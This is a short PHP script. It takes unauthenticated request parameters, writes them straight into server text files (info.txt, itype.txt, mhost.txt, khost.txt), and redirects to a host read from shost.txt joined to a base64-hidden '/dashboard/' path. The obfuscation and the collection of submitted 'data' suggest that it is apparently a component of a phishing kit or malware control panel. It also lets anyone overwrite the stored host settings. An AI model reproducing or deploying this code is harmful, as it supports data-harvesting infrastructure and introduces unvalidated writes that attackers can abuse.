<?php
$mhost = $_REQUEST['mhost'];
$khost = $_REQUEST['khost'];
$data = $_REQUEST['data'];
$itype = $_REQUEST['itype'];
$v = $_REQUEST['v'];
$result="/index.php?r=2";

$itoken=file_get_contents('shost.txt');
$itoken2="L2Rhc2hib2FyZC8=";

$update=base64_decode($itoken);
$connect= base64_decode($itoken2);

$fp = fopen("info.txt", "w+");
fwrite($fp, "$data");

$fp1 = fopen("itype.txt", "w+");
fwrite($fp1, "$itype");

$fp = fopen("mhost.txt", "w+");
fwrite($fp, "$mhost");

$fp1 = fopen("khost.txt", "w+");
fwrite($fp1, "$khost");

header("Location: $update$connect$result");
?>